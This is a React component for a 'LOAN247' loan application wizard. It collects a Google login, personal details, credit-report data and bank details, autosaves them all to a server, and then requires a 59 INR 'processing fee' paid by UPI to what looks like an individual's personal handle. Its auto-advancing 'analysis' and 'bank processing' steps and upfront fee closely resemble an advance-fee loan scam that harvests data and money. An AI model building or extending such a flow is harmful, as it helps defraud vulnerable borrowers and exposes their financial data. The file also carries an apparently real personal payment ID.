"use client";

import { useEffect, useRef } from "react";
import { ArrowLeft, ArrowRight, Info } from "lucide-react";
import { getApplicationRef, isStepValid, useLoanStore, validateStep } from "@/lib/loan-store";
import { ProgressTrack } from "./progress-track";
import { AppDownloadPrompt } from "./app-download-prompt";
import { LoanProductsSection } from "./loan-products-section";
import { WelcomeStep } from "./steps/welcome-step";
import { GoogleLoginStep } from "./steps/google-login-step";
import { BasicInfoStep } from "./steps/basic-info-step";
import { AnalyserStep } from "./steps/analyser-step";
import { CibilReportStep } from "./steps/cibil-report-step";
import { LoanAmountStep } from "./steps/loan-amount-step";
import { BankDetailsStep } from "./steps/bank-details-step";
import { BankProcessingStep } from "./steps/bank-processing-step";
import { PayFeeStep } from "./steps/pay-fee-step";
import { ApplicationInProcessStep } from "./steps/application-in-process-step";

const STEPS = [
  WelcomeStep,
  GoogleLoginStep,
  BasicInfoStep,
  AnalyserStep,
  CibilReportStep,
  LoanAmountStep,
  BankDetailsStep,
  BankProcessingStep,
  PayFeeStep,
  ApplicationInProcessStep,
] as const;

const STEP_LABELS = [
  "Welcome",
  "Google login",
  "Basic info",
  "CIBIL analysis",
  "CIBIL report",
  "Loan amount",
  "Bank details",
  "Bank processing",
  "Processing fee",
  "Application in process",
] as const;

const FEE_AMOUNT = 59;
const UPI_ID = "gulshanyadav62000-6@oksbi";

function getUpiLink(reference: string) {
  const params = new URLSearchParams({
    pa: UPI_ID,
    pn: "LOAN247",
    am: String(FEE_AMOUNT),
    cu: "INR",
    tn: `LOAN247 processing fee ${reference}`,
  });
  return `upi://pay?${params.toString()}`;
}

export function LoanWizard() {
  const step = useLoanStore((s) => s.step);
  const data = useLoanStore((s) => s.data);
  const hydrated = useLoanStore((s) => s.hydrated);
  const hydrate = useLoanStore((s) => s.hydrate);
  const reset = useLoanStore((s) => s.reset);
  const goNext = useLoanStore((s) => s.goNext);
  const goBack = useLoanStore((s) => s.goBack);
  const lastAutosaveKey = useRef("");

  // Load any persisted state (returning customer) AFTER mount to avoid SSR
  // hydration mismatches. A returning customer lands on the step they left
  // (e.g. the Pay step) with all their previously-filled details intact.
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get("selectLoan") === "1" || params.get("apply") === "1") {
      reset();
    }
    hydrate();
  }, [hydrate, reset]);

  useEffect(() => {
    if (!hydrated || step < 2 || validateStep(2, data).length > 0) return;

    const reference = getApplicationRef(data);
    const autosaveKey = JSON.stringify({ reference, step, data });
    if (autosaveKey === lastAutosaveKey.current) return;

    const timeout = window.setTimeout(() => {
      lastAutosaveKey.current = autosaveKey;
      void fetch("/api/applications", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          reference,
          paymentStatus: "pending",
          paymentAmount: FEE_AMOUNT,
          paymentProvider: "UPI",
          paymentLink: getUpiLink(reference),
          lastStep: step,
          lastStepLabel: STEP_LABELS[step] || "Application started",
          data,
        }),
      });
    }, 900);

    return () => window.clearTimeout(timeout);
  }, [data, hydrated, step]);

  const CurrentStep = STEPS[step];
  const isFirst = step === 0;
  const isLast = step === STEPS.length - 1;
  // Steps that auto-advance or have their own CTA (no standard footer needed):
  //  1 Google Login, 3 Analyser, 4 CIBIL, 7 Bank Processing (auto), 8 Pay Fee (own button)
  const isAutoStep = step === 1 || step === 3 || step === 4 || step === 7 || step === 8;
  const canProceed = isStepValid(step, data);

  return (
    <div className="relative flex min-h-screen flex-col bg-white">
      {/* Progress (hidden on welcome & final) */}
      {!isFirst && !isLast && (
        <div className="sticky top-[73px] z-20 border-b border-gray-100 bg-white">
          <div className="mx-auto max-w-3xl px-4 py-3 sm:px-6">
            <ProgressTrack />
          </div>
        </div>
      )}

      {/* Step content */}
      <main className="flex flex-1 items-start justify-center px-4 pt-6 pb-32 sm:px-6 sm:pt-10 sm:pb-36">
        <div className="w-full max-w-5xl">
          {hydrated ? (
            <>
              <div className="mx-auto w-full max-w-3xl">
                <CurrentStep />
              </div>
              {!isFirst && <LoanProductsSection variant="journey" />}
            </>
          ) : (
            <div className="flex h-64 items-center justify-center">
              <div className="h-8 w-8 animate-spin rounded-full border-2 border-gray-200 border-t-emerald-500" />
            </div>
          )}
        </div>
      </main>

      {/* Sticky footer nav */}
      {!isFirst && !isLast && !isAutoStep && hydrated && (
        <footer className="sticky bottom-0 z-30 border-t border-gray-100 bg-white/90 px-4 pb-[max(0.75rem,env(safe-area-inset-bottom))] pt-3 backdrop-blur sm:px-6">
          <div className="mx-auto max-w-3xl">
            {!canProceed && (
              <p className="mb-2 flex items-center justify-center gap-1.5 text-center text-xs font-medium text-amber-600">
                <Info className="h-3.5 w-3.5" />
                Please fill all required fields to continue
              </p>
            )}
            <div className="flex items-center gap-3">
              <button
                onClick={goBack}
                disabled={isFirst}
                className="flex items-center gap-1.5 rounded-xl px-4 py-3 text-sm font-medium text-gray-700 transition-colors hover:bg-gray-100 disabled:cursor-not-allowed disabled:opacity-30"
              >
                <ArrowLeft className="h-4 w-4" />
                <span className="hidden sm:inline">Back</span>
              </button>
              <div className="flex-1" />
              <button
                onClick={goNext}
                disabled={!canProceed}
                className="flex items-center gap-2 rounded-xl bg-gradient-to-r from-blue-500 to-emerald-500 px-7 py-3 text-sm font-semibold text-white shadow-sm transition-all hover:brightness-105 active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-40 disabled:hover:brightness-100 sm:px-8"
              >
                Continue
                <ArrowRight className="h-4 w-4" />
              </button>
            </div>
          </div>
        </footer>
      )}

      {/* App download popup — shown automatically when the website opens */}
      <AppDownloadPrompt />
    </div>
  );
}
